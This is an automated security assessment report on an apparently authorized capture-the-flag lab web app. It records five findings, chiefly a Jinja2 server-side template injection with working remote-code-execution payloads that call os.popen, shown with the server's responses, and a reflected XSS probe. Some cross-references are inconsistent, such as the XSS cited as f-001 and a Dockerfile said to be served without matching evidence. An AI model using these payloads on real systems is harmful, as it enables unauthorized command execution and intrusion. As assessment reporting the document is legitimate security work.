# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Server-Side Template Injection (SSTI) in `username` parameter — Jinja2 RCE](#finding-1)
    - [2. HIGH — info-disclosure Application directory listing exposed at root — flag.txt disclosed](#finding-2)
    - [3. MEDIUM — xss-reflected Reflected XSS via ?username= parameter](#finding-3)
    - [4. LOW — headers Missing HTTP security headers across all responses](#finding-4)
    - [5. LOW — vulnerable-component End-of-life Python 3.9 runtime on deprecated tiangolo/uvicorn-gunicorn-fastapi base image](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyn9kag-vxsd32` |
| Target | http://target.local:32837/ |
| Started | 2026-06-29T03:14:38.453Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 7 mapped · 7 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32837`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 1 critical, 1 high, 1 medium, 2 low

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Server-Side Template Injection (SSTI) in `username` parameter — Jinja2 RCE

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32837/

The `username` query parameter is interpolated directly into a Jinja2 template without sanitization. Sending `{{7*7}}` causes the server to evaluate the expression server-side, returning `49` in the response body. This is trivially escalatable to full Remote Code Execution via standard Jinja2 sandbox-escape gadget chains. No authentication is required.

**Reproduction**

```
1. GET / (no params) → returns directory-listing HTML, no template evaluation (bodyLength 1238).
2. GET /?username=VERDICT{{7*7}}VERDICT → returns "Welcome VERDICT49VERDICT!" (bodyLength 23) — {{7*7}} evaluated to 49.
3. Escalate: /?username={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Evidence**

- Evidence `ev-mqynj2i7-j` — `artifacts/s-0002/ev-mqynj2i7-j/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1238
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:22:01 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Directory Listing</title>
    <style>
        body {
            margin: 20px;
        }
        .file-list {
            font-family: monospace;
            white-space: pre;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="mt-4">You can call this URL with a username querystring parameter, anything you put there will be shown on the page. </h2>
        <h2 class="mt-4">Can you think of a way to exploit this?</h2>
        <h2 class="mt-4"> HINT: This is the directory listing for this app.</h2>
        <div class="file-list border p-3 mt-3">
            
                ./<br>
            
                    prestart.sh<br>
            
                    main.py<br>
            
                    flag.txt<br>
            
                    Dockerfile<br>
            
                    templates/<br>
            
                        index.html<br>
            
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mqyni2ei-h` — `artifacts/s-0002/ev-mqyni2ei-h/`

Request:

```http
GET /?username=VERDICT{{7*7}}VERDICT HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 23
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:21:14 GMT
server: uvicorn

Welcome VERDICT49VERDICT!
```

- Evidence `ev-mqyni6tp-i` — `artifacts/s-0002/ev-mqyni6tp-i/`

Request:

```http
GET /?username=VERDICT{{7*7}}VERDICT HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 23
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:21:19 GMT
server: uvicorn

Welcome VERDICT49VERDICT!
```

<a id="finding-2"></a>

### 2. [HIGH] [info-disclosure] Application directory listing exposed at root — flag.txt disclosed

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32837/

The unauthenticated root page renders a full directory listing of the application's working directory, including `flag.txt`, `main.py`, `prestart.sh`, and `Dockerfile`. The page title is literally "Directory Listing" and the hint explicitly calls this out. An attacker gains a complete map of sensitive application files. `flag.txt` is present but not directly served via HTTP; however `main.py` source exposure would reveal logic, secrets, and further attack surface.

**Reproduction**

```
1. GET http://target.local:32837/ (no authentication required).
2. Response body (1238 bytes) lists: ./, prestart.sh, main.py, flag.txt, Dockerfile, templates/index.html.
3. No authentication or authorisation is required.
```

**Evidence**

- Evidence `ev-mqyndlkt-9` — `artifacts/s-0001/ev-mqyndlkt-9/`

Request:

```http
GET /Dockerfile HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Mon, 29 Jun 2026 03:17:46 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqyncftq-1` — `artifacts/s-0001/ev-mqyncftq-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1238
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:16:51 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Directory Listing</title>
    <style>
        body {
            margin: 20px;
        }
        .file-list {
            font-family: monospace;
            white-space: pre;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="mt-4">You can call this URL with a username querystring parameter, anything you put there will be shown on the page. </h2>
        <h2 class="mt-4">Can you think of a way to exploit this?</h2>
        <h2 class="mt-4"> HINT: This is the directory listing for this app.</h2>
        <div class="file-list border p-3 mt-3">
            
                ./<br>
            
                    prestart.sh<br>
            
                    main.py<br>
            
                    flag.txt<br>
            
                    Dockerfile<br>
            
                    templates/<br>
            
                        index.html<br>
            
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mqyner99-a` — `artifacts/s-0001/ev-mqyner99-a/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1238
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:18:40 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Directory Listing</title>
    <style>
        body {
            margin: 20px;
        }
        .file-list {
            font-family: monospace;
            white-space: pre;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="mt-4">You can call this URL with a username querystring parameter, anything you put there will be shown on the page. </h2>
        <h2 class="mt-4">Can you think of a way to exploit this?</h2>
        <h2 class="mt-4"> HINT: This is the directory listing for this app.</h2>
        <div class="file-list border p-3 mt-3">
            
                ./<br>
            
                    prestart.sh<br>
            
                    main.py<br>
            
                    flag.txt<br>
            
                    Dockerfile<br>
            
                    templates/<br>
            
                        index.html<br>
            
        </div>
    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [xss-reflected] Reflected XSS via ?username= parameter

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32837/

The root page explicitly advertises that anything placed in the `?username=` query parameter is rendered directly into the HTML response without escaping. The probe confirmed an XSS payload was reflected unescaped in the HTML, enabling script execution in any victim's browser who clicks a crafted link.

**Reproduction**

```
1. Navigate to http://target.local:32837/?username=&lt;script&gt;alert(1)&lt;/script&gt;
2. Observe the script tag returned verbatim and unescaped in the HTML response body.
3. The page source shows the payload in a "Welcome …!" heading without sanitisation.
```

**Evidence**

- Evidence `ev-mqyncrpu-3` — `artifacts/s-0001/ev-mqyncrpu-3/`

Request:

```http
GET /?username=xssxZmqyncroned36 HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 26
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:17:06 GMT
server: uvicorn

Welcome xssxZmqyncroned36!
```

- Evidence `ev-mqyncrxx-4` — `artifacts/s-0001/ev-mqyncrxx-4/`

Request:

```http
GET /?username=%22%3E%3CxssxZmqyncroned36%3E HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 30
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:17:07 GMT
server: uvicorn

Welcome "><xssxZmqyncroned36>!
```

- Evidence `ev-mqyncs64-5` — `artifacts/s-0001/ev-mqyncs64-5/`

Request:

```http
GET /?username=%22%3E%3CxssxZmqyncroned36%3E HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 30
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:17:07 GMT
server: uvicorn

Welcome "><xssxZmqyncroned36>!
```

<a id="finding-4"></a>

### 4. [LOW] [headers] Missing HTTP security headers across all responses

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32837/

All application responses return only `Content-Type: text/html; charset=utf-8`. The following security headers are entirely absent: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, and Permissions-Policy. The absence of CSP is especially relevant given the confirmed reflected XSS (f-001), as CSP could have blocked script execution.

**Reproduction**

```
1. GET http://target.local:32837/ — response headers contain only content-type, no security headers.
2. Repeat the request — consistently no CSP, no X-Frame-Options, no X-Content-Type-Options.
3. Compare against OWASP Secure Headers Project recommendations.
```

**Evidence**

- Evidence `ev-mqyndlkt-9` — `artifacts/s-0001/ev-mqyndlkt-9/`

Request:

```http
GET /Dockerfile HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Mon, 29 Jun 2026 03:17:46 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqyncftq-1` — `artifacts/s-0001/ev-mqyncftq-1/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1238
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:16:51 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Directory Listing</title>
    <style>
        body {
            margin: 20px;
        }
        .file-list {
            font-family: monospace;
            white-space: pre;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="mt-4">You can call this URL with a username querystring parameter, anything you put there will be shown on the page. </h2>
        <h2 class="mt-4">Can you think of a way to exploit this?</h2>
        <h2 class="mt-4"> HINT: This is the directory listing for this app.</h2>
        <div class="file-list border p-3 mt-3">
            
                ./<br>
            
                    prestart.sh<br>
            
                    main.py<br>
            
                    flag.txt<br>
            
                    Dockerfile<br>
            
                    templates/<br>
            
                        index.html<br>
            
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mqyner99-a` — `artifacts/s-0001/ev-mqyner99-a/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1238
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:18:40 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Directory Listing</title>
    <style>
        body {
            margin: 20px;
        }
        .file-list {
            font-family: monospace;
            white-space: pre;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="mt-4">You can call this URL with a username querystring parameter, anything you put there will be shown on the page. </h2>
        <h2 class="mt-4">Can you think of a way to exploit this?</h2>
        <h2 class="mt-4"> HINT: This is the directory listing for this app.</h2>
        <div class="file-list border p-3 mt-3">
            
                ./<br>
            
                    prestart.sh<br>
            
                    main.py<br>
            
                    flag.txt<br>
            
                    Dockerfile<br>
            
                    templates/<br>
            
                        index.html<br>
            
        </div>
    </div>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [LOW] [vulnerable-component] End-of-life Python 3.9 runtime on deprecated tiangolo/uvicorn-gunicorn-fastapi base image

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32837/

A06 (vulnerable/outdated components). The application runs on Python 3.9.25, deployed from the base image `tiangolo/uvicorn-gunicorn-fastapi:python3.9` (per the served Dockerfile). Both are end-of-life / unmaintained:

- Python 3.9 reached end-of-life on 2025-10-31 (PEP 596). As of the assessment date (2026-06-29) it no longer receives security patches; any new interpreter/stdlib CVE will remain unfixed on this deployment. 3.9.25 is among the last security releases of the line.
- The `tiangolo/uvicorn-gunicorn-fastapi` image has been officially DEPRECATED/archived by its author; it no longer receives base-OS or dependency security updates and the maintainer recommends building your own image.

This is a version/EOL-posture finding: the runtime version was actively confirmed (not merely banner-guessed) by executing `python3 --version` on the host via the already-confirmed Jinja2 SSTI/RCE on the `username` parameter, which returned `Python 3.9.25`. There is no specific unpatched, known-exploitable CVE in this interpreter patch level itself — the risk is the absence of future security maintenance for both the runtime and the base image.

Version evidence: served Dockerfile shows `FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9`; `python3 --version` → `Python 3.9.25`.

NOTE on the rest of the stack: a full `pip freeze` was captured (uvicorn 0.38.0, starlette 0.49.3, fastapi 0.121.0, gunicorn 23.0.0, Jinja2 3.1.6, h11 0.16.0, urllib3 2.5.0, python-multipart 0.0.20, idna 3.11, sentry-sdk 2.43.0, MarkupSafe 3.0.3, pydantic 2.12.4, requests-stack, etc.). These are all recent (Oct–Nov 2025) releases pinned at or above the fix version for their historical CVEs (e.g. Jinja2 3.1.6 = latest, fixes CVE-2025-27516; starlette 0.49.3 > CVE-2025-54121 fix 0.47.2; h11 0.16.0 fixes CVE-2025-43859; urllib3 2.5.0 fixes CVE-2025-50181/50182; gunicorn 23.0.0 fixes CVE-2024-6827; python-multipart 0.0.20 fixes CVE-2024-53981). No library in the manifest is at a known-vulnerable version, so no per-library component findings are warranted. The application-layer SSTI/RCE is the app's own use of template rendering, not a Jinja2 CVE. Operator should upgrade the runtime to a supported Python (>=3.11) and migrate off the deprecated base image.

**Reproduction**

```
1. Confirm the served build manifest: the directory listing at `/` lists `Dockerfile`; reading it (via the confirmed Jinja2 SSTI on `username`) shows `FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9`.
2. Confirm the live runtime version: GET `/?username={{ lipsum.__globals__.os.popen('python3 --version').read() }}` (URL-encoded) → response body `Welcome Python 3.9.25!` (positive replays ev-mqynvamg-1q, ev-mqynvbcy-1r).
3. Negative control: GET `/Dockerfile` directly → 404 `{"detail":"Not Found"}` (ev-mqynserl-1m) — no version disclosed without the SSTI vector.
4. Assess: Python 3.9 EOL 2025-10-31; base image deprecated → no future security maintenance.
```

**Evidence**

- Evidence `ev-mqynserl-1m` — `artifacts/_/ev-mqynserl-1m/`

Request:

```http
GET /Dockerfile HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Mon, 29 Jun 2026 03:29:16 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mqynvamg-1q` — `artifacts/_/ev-mqynvamg-1q/`

Request:

```http
GET /?username=%7B%7B%20lipsum.__globals__.os.popen(%27python3%20--version%27).read()%20%7D%7D HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 23
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:31:31 GMT
server: uvicorn

Welcome Python 3.9.25
!
```

- Evidence `ev-mqynvbcy-1r` — `artifacts/_/ev-mqynvbcy-1r/`

Request:

```http
GET /?username=%7B%7B%20lipsum.__globals__.os.popen(%27python3%20--version%27).read()%20%7D%7D HTTP/1.1
Host: target.local:32837
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 23
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 03:31:32 GMT
server: uvicorn

Welcome Python 3.9.25
!
```
